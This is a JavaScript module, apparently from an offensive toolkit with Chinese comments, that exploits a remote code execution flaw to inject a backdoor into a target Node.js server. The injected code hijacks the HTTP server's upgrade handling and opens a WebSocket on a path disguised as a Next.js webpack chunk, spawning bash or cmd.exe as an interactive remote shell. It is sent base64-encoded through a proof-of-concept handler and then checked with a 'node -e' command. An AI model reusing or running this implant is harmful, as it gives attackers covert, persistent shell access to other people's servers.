import { executePOC } from './poc-handler.js'
import { loadSettings } from './storage-handler.js'
import { createLogger } from './utils/logger.js'
import { TERMINAL_INJECT_SUCCESS, TERMINAL_TARGET_NOT_VULNERABLE } from './error-codes.js'

const logger = createLogger('TerminalInjector')

/**
 * 生成要注入的终端后端代码
 * 通过劫持 http.Server.prototype.emit 来拦截 upgrade 事件
 */
function generateTerminalBackendCode(wsPath = '/_next/static/chunks/webpack-terminal') {
  // 注意：这段代码会被注入到目标服务器执行
  const backendCode = `(function(){try{const http=require('http');const url=require('url');const crypto=require('crypto');const cp=require('child_process');const WS_PATH='${wsPath}';const sessions=new Map();function acceptWebSocket(req,socket){const key=req.headers['sec-websocket-key'];if(!key){socket.end('HTTP/1.1 400 Bad Request\\r\\n\\r\\n');return null;}const hash=crypto.createHash('sha1').update(key+'258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');const headers=['HTTP/1.1 101 Switching Protocols','Upgrade: websocket','Connection: Upgrade','Sec-WebSocket-Accept: '+hash,''].join('\\r\\n')+'\\r\\n';socket.write(headers);return socket;}function parseFrame(buffer){if(buffer.length<2)return null;const firstByte=buffer[0];const secondByte=buffer[1];const opcode=firstByte&0x0F;const isMasked=(secondByte&0x80)===0x80;let payloadLength=secondByte&0x7F;let offset=2;if(payloadLength===126){if(buffer.length<4)return null;payloadLength=buffer.readUInt16BE(2);offset=4;}else if(payloadLength===127){if(buffer.length<10)return null;payloadLength=buffer.readUInt32BE(6);offset=10;}if(!isMasked)return null;const maskingKey=buffer.slice(offset,offset+4);offset+=4;if(buffer.length<offset+payloadLength)return null;const payload=Buffer.alloc(payloadLength);for(let i=0;i<payloadLength;i++){payload[i]=buffer[offset+i]^maskingKey[i%4];}return{opcode,payload:payload.toString('utf8'),length:offset+payloadLength};}function buildFrame(data){const payload=Buffer.from(data,'utf8');const length=payload.length;let frame;if(length<126){frame=Buffer.alloc(2+length);frame[0]=0x81;frame[1]=length;payload.copy(frame,2);}else if(length<65536){frame=Buffer.alloc(4+length);frame[0]=0x81;frame[1]=126;frame.writeUInt16BE(length,2);payload.copy(frame,4);}else{frame=Buffer.alloc(10+length);frame[0]=0x81;frame[1]=127;frame.writeUInt32BE(0,2);frame.writeUInt32BE(length,6);payload.copy(frame,10);}return frame;}function handleTerminalWebSocket(req,socket,head){const ws=acceptWebSocket(req,socket);if(!ws)return;const sessionId=crypto.randomBytes(16).toString('hex');const shell=process.platform==='win32'?'cmd.exe':'/bin/bash';const pty=cp.spawn(shell,[],{stdio:['pipe','pipe','pipe'],env:process.env});sessions.set(sessionId,{ws,pty});let buffer=Buffer.alloc(0);ws.on('data',(chunk)=>{buffer=Buffer.concat([buffer,chunk]);while(buffer.length>0){const frame=parseFrame(buffer);if(!frame)break;buffer=buffer.slice(frame.length);if(frame.opcode===0x08){pty.kill();ws.end();sessions.delete(sessionId);return;}if(frame.opcode===0x01){try{pty.stdin.write(frame.payload);}catch(e){}}}});pty.stdout.on('data',(data)=>{try{ws.write(buildFrame(data.toString('utf8')));}catch(e){}});pty.stderr.on('data',(data)=>{try{ws.write(buildFrame(data.toString('utf8')));}catch(e){}});pty.on('exit',()=>{try{ws.end();}catch(e){}sessions.delete(sessionId);});ws.on('close',()=>{pty.kill();sessions.delete(sessionId);});ws.on('error',()=>{pty.kill();sessions.delete(sessionId);});setTimeout(()=>{try{const platform=process.platform;const welcome='Terminal Ready (Platform: '+platform+')\\r\\n';ws.write(buildFrame(welcome));}catch(e){}},100);}const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){try{if(event==='upgrade'){const[req,socket,head]=args;const parsed=url.parse(req.url,true);if(parsed.pathname===WS_PATH){handleTerminalWebSocket(req,socket,head);return true;}}}catch(e){console.error('Terminal handler error:',e);}return originalEmit.apply(this,arguments);};global.__terminalBackendInjected=true;global.__terminalBackendPath=WS_PATH;console.log('Terminal backend injected at:',WS_PATH);}catch(e){console.error('Terminal injection error:',e);}})();`

  return backendCode
}

/**
 * 通过 POC 注入终端后端
 * @param {string} targetUrl - 目标服务器 URL
 * @param {string} wsPath - WebSocket 路径
 * @returns {Promise<{success: boolean, wsPath?: string, error?: string}>}
 */
export async function injectTerminalBackend(
  targetUrl,
  wsPath = '/_next/static/chunks/webpack-terminal'
) {
  try {
    const backendCode = generateTerminalBackendCode(wsPath)

    // 使用特殊标记，让 POC 处理器直接执行 JavaScript 代码
    // 格式: __EVAL__:base64编码的代码
    const base64Code = Buffer.from(backendCode).toString('base64')
    const command = `__EVAL__:${base64Code}`

    logger.info('注入终端后端代码', { wsPath, commandLength: command.length })

    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    const result = await executePOC(targetUrl, command, settings)

    logger.debug('POC 执行结果', {
      is_vulnerable: result.is_vulnerable,
      status_code: result.status_code,
      digest_length: result.digest_content?.length || 0,
      command_failed: result.command_failed,
      failure_reason: result.failure_reason
    })

    // 如果有输出，打印前 500 个字符用于调试
    if (result.digest_content && result.digest_content.length > 0) {
      logger.debug('注入输出预览', { preview: result.digest_content.substring(0, 500) })
    }

    if (result.is_vulnerable) {
      // 等待一下让代码执行
      await new Promise((resolve) => setTimeout(resolve, 1000))

      logger.success('终端后端注入成功', { wsPath })
      return {
        success: true,
        wsPath,
        message: TERMINAL_INJECT_SUCCESS
      }
    } else {
      logger.warn('目标不可利用', { targetUrl })
      return {
        success: false,
        error: TERMINAL_TARGET_NOT_VULNERABLE
      }
    }
  } catch (error) {
    logger.error('注入终端后端失败', error)
    return {
      success: false,
      error: error.message
    }
  }
}

/**
 * 测试终端后端是否可用
 * 通过检查全局变量来验证注入是否成功
 * @param {string} targetUrl - 目标服务器 URL
 * @returns {Promise<boolean>}
 */
export async function testTerminalBackend(targetUrl) {
  try {
    // 使用 node -e 来执行 JavaScript 代码
    const checkCommand =
      "node -e \"console.log(typeof global.__terminalBackendInjected !== 'undefined' ? 'INJECTED:' + global.__terminalBackendPath : 'NOT_INJECTED')\""

    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    const result = await executePOC(targetUrl, checkCommand, settings)

    logger.debug('后端测试结果', { content: result.digest_content })

    if (result.is_vulnerable && result.digest_content) {
      return result.digest_content.includes('INJECTED')
    }

    return false
  } catch (error) {
    logger.error('测试后端失败', error)
    return false
  }
}
